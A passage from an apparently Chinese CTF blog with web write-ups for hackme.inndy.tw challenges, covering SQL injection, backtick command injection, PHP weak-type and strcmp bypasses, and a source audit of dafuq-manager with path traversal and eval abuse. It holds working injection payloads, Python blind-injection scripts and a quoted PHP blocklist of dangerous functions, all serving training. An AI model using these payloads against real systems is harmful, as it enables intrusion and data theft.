<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from table_name where user&#x3D;&#39;11&#39; and password&#x3D;&#39;22&#39;</span><br><span class="line">select * from table_name where user&#x3D;&#39;11&#39; union select 1,2,3&#x2F;*&#39;and password&#x3D;&#39;*&#x2F;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3jlzcqphdj30mz076772.jpg" alt=""></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hackme-web</title>
    <url>/2019/10/27/Hackme-web/</url>
    <content><![CDATA[<h3 id="Guestbook"><a href="#Guestbook" class="headerlink" title="Guestbook"></a>Guestbook</h3><p>注入点挺多</p>
<p>insert标题处存在注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and sleep(3) and &#39;</span><br></pre></td></tr></table></figure>

<p>即可验证成功</p>
<p>id地方也可以注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1 union select 1,2,3,(select group_concat(flag) from flag) --</span><br></pre></td></tr></table></figure>

<p>思考了一下如何最快的通过注入拿到数据的方法，时间盲注那肯定是最慢的，还受网络影响…,不到最后还是别时间盲注了吧</p>
<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>没过滤掉危险的反引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;nl f*&#96;&#x2F;&#x2F;通过sort也可以</span><br></pre></td></tr></table></figure>

<h3 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h3><p>严重吐槽scoreboard和homepage两个题…..累不累啊..</p>
<h3 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算是个脑筋急转弯吧，开始通过payload进去了，发现是guest，那可能admin在id为2的那条</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:admin\&#39; or is_admin&#x3D;1#</span><br><span class="line"> &#x2F;&#x2F; admin\&#39; or id&#x3D;2#</span><br></pre></td></tr></table></figure>

<h3 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h3><p>可以堆叠加盲注</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">"https://hackme.inndy.tw/login0/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		data=&#123;</span><br><span class="line">	<span class="string">'name'</span>:<span class="string">"admin\';select if(&#123;&#125;=ascii(mid((version()),&#123;&#125;,1)),sleep(3),1);"</span>.format(j,i),</span><br><span class="line">	<span class="string">'password'</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r=requests.post(url,data=data,timeout=<span class="number">2.8</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			flag+=chr(j)</span><br><span class="line">			<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>然而更好做法是union…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin\&#39; union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#</span><br></pre></td></tr></table></figure>

<p>以后做题还是先试试union或者报错注入，毕竟时间盲注是最低效的操作。</p>
<h3 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h3><p>变了一下过滤，没什么太大用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没啥区别…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;id&#x3D;2#</span><br></pre></td></tr></table></figure>

<h3 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a>login as admin 1.2</h3><p>这个问题，上次盲注脚本就能解决，空格换一下就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;login0&#x2F;&quot;</span><br><span class="line">for i in range(1,32):</span><br><span class="line">	for j in range(33,127):</span><br><span class="line">		data&#x3D;&#123;</span><br><span class="line">	&#39;name&#39;:&quot;admin\&#39;;select&#x2F;**&#x2F;if(&#123;&#125;&#x3D;ascii(mid((version()),&#123;&#125;,1)),sleep(3),1);&quot;.format(j,i),</span><br><span class="line">	&#39;password&#39;:1</span><br><span class="line">&#125;</span><br><span class="line">		try:</span><br><span class="line">			r&#x3D;requests.post(url,data&#x3D;data,timeout&#x3D;2.8)</span><br><span class="line">		except:</span><br><span class="line">			flag+&#x3D;chr(j)</span><br><span class="line">			print flag</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin-3"><a href="#Login-as-Admin-3" class="headerlink" title="Login as Admin 3"></a>Login as Admin 3</h3><p>最开始有点想偏了…还想从json中注入新的admin字段…真是天真，后来发现hmac有弱类型比较，爆破一下cookie中的值就行了，发现9的时候正好可以。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"https://hackme.inndy.tw/login3/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">	data=<span class="string">'&#123;"sig":0,"data":"[\\"guest\\",'</span>+chr(i)+<span class="string">']"&#125;'</span></span><br><span class="line">	<span class="keyword">print</span> data</span><br><span class="line">	payload=base64.b64encode(data)</span><br><span class="line">	cookies=&#123;</span><br><span class="line">	<span class="string">'user'</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	r=requests.get(url,cookies=cookies)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"You are admin"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="comment">###</span></span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin4"><a href="#Login-as-Admin4" class="headerlink" title="Login as Admin4"></a>Login as Admin4</h3><p>应该算个逻辑漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'name'</span>] === <span class="string">'admin'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'password'</span>] !== $password) &#123;</span><br><span class="line">        <span class="comment">// show failed message if you input wrong password</span></span><br><span class="line">        header(<span class="string">'Location: ./?failed=1'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们知道在location后如果不加exit()那么会执行header下面的代码</p>
<p>我们在用curl的时候不加-L是不会跟随跳转的，所以如果接着执行下面的代码的话，直接会bypass验证，拿到flag，所以header后一定要加个exit()啊</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;login4&#x2F; -d &quot;name&#x3D;admin&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin6"><a href="#Login-as-Admin6" class="headerlink" title="Login as Admin6"></a>Login as Admin6</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//&#123;"username":"admin","users":&#123;"admin":"lihuaiqiu"&#125;,"password":"lihuaiqiu"&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'username'</span>]=<span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'users'</span>][<span class="string">'admin'</span>]=<span class="string">'lihuaiqiu'</span>;</span><br><span class="line"></span><br><span class="line">$payload[<span class="string">'password'</span>]=<span class="string">'lihuaiqiu'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> json_encode($payload);</span><br></pre></td></tr></table></figure>

<h3 id="Login-as-Admin7"><a href="#Login-as-Admin7" class="headerlink" title="Login as Admin7"></a>Login as Admin7</h3><p>弱类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">password=QNKCDZO</span><br></pre></td></tr></table></figure>

<h3 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h3><p>这个系列的靶场我觉得挺有意思的，有种小小型cms的感觉吧，也学到了一些有趣的知识</p>
<p>第一关需要登陆guest找到flag</p>
<p>我们可以看到cookie里有一些有趣的东西，将cookie中的show_hidden改为yes拿到flag</p>
<h3 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h3><p>题目要求以admin登陆才可以拿到flag,并且给了源码，把源码下载下来开始审计</p>
<p>可以看到入口是一个switch（话说这代码写的看的人是真的难受…</p>
<p><strong>index.php中跟进case “admin”</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">    <span class="keyword">require</span> <span class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">    show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>fun_admin.php中跟进show_admin</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line"><span class="comment">// admin所拥有的功能</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当$GLOBALS[“permissions”]大于4，即可满足所有admin功能</p>
<p>可以看一下当前用户的permissons</p>
<p><strong>跟进fun_users.php中activate_user</strong></p>
<p>发现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">activate_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $data = find_user($user, $pass);</span><br><span class="line">    <span class="keyword">if</span> ($data == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    ...</span><br><span class="line">    $GLOBALS[<span class="string">"permissions"</span>] = $data[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进find_user</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进$GLOBALS[“users”]</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>其实我们最终得到的也就是这个数组，$data[6]=1,所以不满足admin功能的权限要求，可以思考一下，如果想要我们以admin登陆，会有哪几种方法呢，刚才跟进的时候会发现htusers.php是储存着用户信息的，第一种方法我们可以去读取题中的htuseres，第二种就是sql注入，第三种就是hash长度扩展攻击</p>
<p>思考一下这几种方法的可行性</p>
<ul>
<li>文件读取的话，本题恰好有下载功能，当然其他函数也可以读源码，比如file_get_contents,readfile,fopen之类的</li>
<li>sql注入…我连个select语句都没看到，应该不可能</li>
<li>hash长度扩展攻击，没有关键的代码出现，也不可能</li>
</ul>
<p>所以最终攻击点还是落在文件读取，我们可以去读题种的htusers.php来得到用户的信息，首先去看一下download功能，因为一般拿到源码都是通过download</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> (<span class="string">'core/secure.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">...</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先跟进约束条件进行一些尝试</p>
<p>$GLOBALS[“permissions”] &amp; 01，我们身为guest还是很满足这个条件的</p>
<p>get_is_file函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_is_file</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @is_file(get_abs_item($dir, $item));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进get_abs_item</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_abs_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> get_abs_dir($dir) . <span class="string">"/"</span> . $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_abs_dir</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $abs_dir = $GLOBALS[<span class="string">"home_dir"</span>]; <span class="comment">//home_dir="data/guest"</span></span><br><span class="line">    <span class="keyword">if</span> ($dir != <span class="string">""</span>) $abs_dir.= <span class="string">"/"</span> . $dir;</span><br><span class="line">    <span class="keyword">return</span> $abs_dir;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在$dir为空的情况下其实就是用is_file对data/guest/$item进行判断，那么这个条件也肯定是满足的</p>
<p><strong>跟进get_show_item</strong></p>
<p>发现劝退代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$abs_item = get_abs_item($dir, $item);<span class="comment">//     /$item</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">$browser = id_browser();</span><br></pre></td></tr></table></figure>

<p>如果发现.php或者config直接不解释返回false，正好我们需要这两个字符串，所以download这个地方是不行了，接着换个思路，全局搜索一下readfile,file_get_contents，fopen这样的函数</p>
<p><strong>最后在fun_edit.php中的edit_file中发现fopen，重新回到入口，发现action为edit也正好对应edit_file这个函数，跟进edit_file</strong></p>
<p>前三个条件都是正常符合的，在get_show_item中其实他是存在过滤的，只不过可能过滤的不太对，比如下面这段代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>

<p>基本相当于没作用吧，接着回去</p>
<p>在$dir置空的情况下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$fname = get_abs_item($dir, $item);</span><br></pre></td></tr></table></figure>

<p>$fname=data/guest.$item</p>
<p>接下来调用file_in_web函数判断fname</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_in_web($fname)) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_in_web</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $file = realpath($file);</span><br><span class="line">    <span class="keyword">if</span>(strpos($file, ROOT) !== <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要读的路径字符串里面是有ROOT的，所以返回true符合条件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>]) &amp;&amp; $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"dosave"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">    $item = basename(stripslashes($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"fname"</span>]));</span><br><span class="line">    $fname2 = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($item) || $item == <span class="string">""</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnoname"</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($fname != $fname2 &amp;&amp; @file_exists($fname2)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"itemdoesexist"</span>]);</span><br><span class="line">    savefile($dir, $fname2);</span><br><span class="line">    $fname = $fname2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个不post直接就向下执行了</p>
<p>通过如下代码输出文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$fp = @fopen($fname, <span class="string">"r"</span>);</span><br><span class="line">$buffer = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">    $buffer.= fgets($fp, <span class="number">4096</span>);</span><br><span class="line">&#125;</span><br><span class="line">@fclose($fp);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($buffer);</span><br></pre></td></tr></table></figure>

<p>以后我全局搜索再加个buffer.233</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=../../../../../var/www/webhdisk/.config/.htusers.php</span></span><br></pre></td></tr></table></figure>

<p>/var/www/webhdisk/data/guest一共有五层，所以需要向上跳五层，最终拿到文件内容</p>
<p><img src="https://s2.ax1x.com/2019/10/22/KGedv4.png" alt="KGedv4.png"></p>
<h3 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a>dafuq-manager 3</h3><p>拿shell命令执行，全局搜索eval,assert之类的，发现在debug的地方存在问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">'`'</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码就比较简单了，secret我们知道，主要bypass的代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">    show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个必须三个都返回0才能避免show_error，但是一个字符串不可能同时是这三个字符串，不过strcmp有经典的数组绕过，直接就可以bypass了，传给dir[]=1,其他的照常，就可以成功命令执行了。</p>
<h3 id="command-executor"><a href="#command-executor" class="headerlink" title="command-executor"></a>command-executor</h3><p>这题提供了几个功能</p>
<ul>
<li>Tar File</li>
<li>Cmd exec(只能执行ls和env)</li>
<li>ls（查看各个目录的内容)</li>
</ul>
<p>首先通过ls功能发现根目录有flag和flag-reader，而且可以通过php伪协议读源码</p>
<p>主要代码还是index.php</p>
